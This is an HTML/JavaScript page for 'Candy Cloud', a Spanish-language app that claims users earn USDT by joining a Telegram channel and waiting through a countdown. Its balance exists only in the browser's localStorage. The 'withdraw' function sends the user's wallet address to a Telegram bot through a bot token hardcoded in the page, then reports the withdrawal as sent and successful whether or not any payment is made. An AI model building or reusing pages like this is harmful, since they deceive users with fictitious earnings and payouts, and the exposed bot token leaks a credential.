<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Candy Cloud</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --accent: #ff007a; --neon-cyan: #00f2ff; --gold: #ffcc00;
            --deep-dark: #05080f; --glass: rgba(255, 255, 255, 0.03);
            --grad-prime: linear-gradient(135deg, #ff007a 0%, #7000ff 100%);
            --grad-gold: linear-gradient(135deg, #bf953f, #fcf6ba, #b38728, #fbf5b7, #aa771c);
        }
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; outline: none; }
        body {
            font-family: 'Outfit', sans-serif; background-color: var(--deep-dark);
            color: #ffffff; margin: 0; padding: 0; overflow-x: hidden;
            background-image: radial-gradient(circle at top right, rgba(255, 0, 122, 0.08), transparent 40%);
            min-height: 100vh;
        }
        .app-container { width: 100%; max-width: 480px; margin: 0 auto; padding: 25px; padding-bottom: 120px; }
        .balance-card {
            background: linear-gradient(145deg, rgba(255,255,255,0.05), rgba(0,0,0,0.4));
            border-radius: 40px; padding: 40px 20px; text-align: center; border: 1px solid rgba(255,255,255,0.06);
            box-shadow: 0 40px 80px rgba(0,0,0,0.5);
        }
        .main-amount { font-size: 3.5rem; font-weight: 800; letter-spacing: -3px; display: inline-block; }
        .prime-btn { background: var(--grad-prime); border: none; width: 100%; padding: 22px; border-radius: 25px; color: white; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; margin-top: 25px; display: flex; align-items: center; justify-content: center; gap: 12px; }
        .status-box { background: rgba(0,242,255,0.05); border-left: 3px solid var(--neon-cyan); padding: 15px; border-radius: 15px; margin-top: 20px; display: none; font-size: 13px; animation: slideUp 0.3s ease; }
        
        /* Modal de Billetera */
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 9999; display: none; align-items: center; justify-content: center; padding: 30px; backdrop-filter: blur(15px); }
        .modal-card { background: #0a0e17; border: 1px solid rgba(255,255,255,0.08); border-radius: 35px; padding: 40px 25px; text-align: center; width: 100%; }
        
        input { width: 100%; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 15px; border-radius: 15px; color: #fff; margin-top: 15px; font-family: 'Outfit'; text-align: center; }
        
        #video-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:10000; display:none; flex-direction:column; align-items:center; justify-content:center; }
        #timer { font-size: 90px; font-weight: 800; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="modal-overlay" id="modal-withdraw">
    <div class="modal-card">
        <div style="font-size: 40px;">🏦</div>
        <h2 style="margin:10px 0; font-weight:800;">Retirar Fondos</h2>
        <p style="font-size:12px; color:#666;">Introduce tu billetera USDT (Polygon/MATIC)</p>
        <input type="text" id="wallet-addr" placeholder="0x...">
        <button class="prime-btn" onclick="confirmWithdraw()">CONFIRMAR RETIRO</button>
        <button style="background:none; border:none; color:#444; margin-top:15px; cursor:pointer;" onclick="closeW()">Cancelar</button>
    </div>
</div>

<div class="app-container">
    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:30px;">
        <div style="font-weight:800; font-size:22px; letter-spacing:-1px;">CANDY CLOUD</div>
        <div style="display:flex; gap:8px;">
            <div class="lang-dot active" id="btn-es">ES</div>
            <div class="lang-dot" id="btn-en">EN</div>
        </div>
    </div>

    <div id="v-home">
        <div class="balance-card">
            <div style="font-size: 11px; color: #555;">BALANCE NETO</div>
            <div class="main-amount">$<span id="val-balance">0.0400</span></div>
            <div style="margin-top:15px; font-size:13px; background:rgba(255,255,255,0.03); padding:8px 15px; border-radius:50px; display:inline-block;">
                🍬 Caramelos: <b id="val-candy" style="color:var(--accent)">0</b>
            </div>
        </div>

        <div id="status-msg" class="status-box"></div>

        <button class="prime-btn" onclick="startTask()">Ejecutar Tarea Diaria</button>

        <button class="prime-btn" style="background:none; border:1px solid #1a1a1a; color:#fff;" onclick="openW()">Retirar (0.02 USDT)</button>
        
        <div id="hist-section" style="margin-top:30px; display:none;">
            <div style="font-size:10px; color:#444; font-weight:800; text-transform:uppercase; margin-bottom:10px;">Historial</div>
            <div id="history-list"></div>
        </div>
    </div>

    <div id="v-earn" style="display:none;">
        <h2 style="font-weight:800;">Misiones</h2>
        <div style="background:var(--glass); padding:20px; border-radius:25px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; border:1px solid rgba(255,255,255,0.03);">
            <div><b>Canal Oficial</b><br><small style="color:var(--gold)">+1 Caramelo</small></div>
            <button class="prime-btn" id="btn-c1" style="width:auto; padding:12px 20px; margin:0;" onclick="join(1)">UNIRSE</button>
        </div>
    </div>
</div>

<div id="video-overlay"><div id="timer">10</div></div>

<nav style="position:fixed; bottom:0; left:0; width:100%; background:rgba(5,8,15,0.98); display:flex; justify-content:space-around; padding:20px; border-top:1px solid #111; z-index:100;">
    <button onclick="view('home')" style="background:none; border:none; color:#fff; font-weight:800;">INICIO</button>
    <button onclick="view('earn')" style="background:none; border:none; color:#666; font-weight:800;">GANA</button>
</nav>

<script>
    const TG_TOKEN = "8746370321:AAHLrn8OHEPNqyOIqY75Q4ocBVOgsZ8GI34";
    const CHISMOSO_ID = "@ALSKSNNSLSMS"; 

    let db = { balance: 0.0400, candies: 0, last: '', hist: [], refBy: null };

    function save() { localStorage.setItem('_candy_wallet_v1', JSON.stringify(db)); }
    
    function openW() {
        if(db.balance < 0.02) return showStatus("SALDO INSUFICIENTE", true);
        document.getElementById('modal-withdraw').style.display = 'flex';
    }

    function closeW() { document.getElementById('modal-withdraw').style.display = 'none'; }

    function confirmWithdraw() {
        const wallet = document.getElementById('wallet-addr').value;
        if(wallet.length < 10) return alert("Pon una billetera válida de Polygon");

        const amount = 0.02;
        // MENSAJE PARA EL CHISMOSO CON LA BILLETERA
        const msg = `🚨 *NUEVO RETIRO PENDIENTE*\n\n💰 Monto: ${amount} USDT\n📍 Red: Polygon\n🏦 Billetera: \`${wallet}\`\n\n⚠️ Pagar ahora.`;
        
        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHISMOSO_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        
        db.hist.unshift({ amt: amount, date: new Date().toLocaleDateString() });
        db.balance -= 0.02;
        save();
        update();
        closeW();
        showStatus("RETIRO ENVIADO ✅");
    }

    function update() {
        document.getElementById('val-balance').innerText = db.balance.toFixed(4);
        document.getElementById('val-candy').innerText = db.candies;
        if(db.hist.length > 0) {
            document.getElementById('hist-section').style.display = 'block';
            document.getElementById('history-list').innerHTML = db.hist.map(h => `
                <div style="background:rgba(255,255,255,0.02); padding:10px; border-radius:15px; margin-top:5px; display:flex; justify-content:space-between;">
                    <span><b>${h.amt} USDT</b></span><span>EXITOSO</span>
                </div>
            `).join('');
        }
    }

    function showStatus(txt, err=false) { 
        const b = document.getElementById('status-msg'); b.innerText = txt; b.style.display = 'block'; 
        setTimeout(() => b.style.display='none', 4000); 
    }

    function startTask() {
        if(db.candies < 1) return showStatus("Únete al canal primero 🔒", true);
        document.getElementById('video-overlay').style.display = 'flex';
        let c = 10;
        const t = setInterval(() => { c--; document.getElementById('timer').innerText = c; if(c<=0) { clearInterval(t); document.getElementById('video-overlay').style.display='none'; finish(); } }, 1000);
    }

    function finish() {
        db.balance += 0.01; db.last = new Date().toDateString();
        save(); update(); showStatus("+0.01 USDT ✅");
    }

    function join(n) { window.open('https://t.me/CandyCloudoficial'); db.candies++; save(); update(); }
    function view(v) { document.getElementById('v-home').style.display = (v === 'home' ? 'block' : 'none'); document.getElementById('v-earn').style.display = (v === 'earn' ? 'block' : 'none'); }
    
    window.onload = () => {
        const d = localStorage.getItem('_candy_wallet_v1');
        if(d) db = JSON.parse(d);
        update();
    };
</script>
</body>
</html>
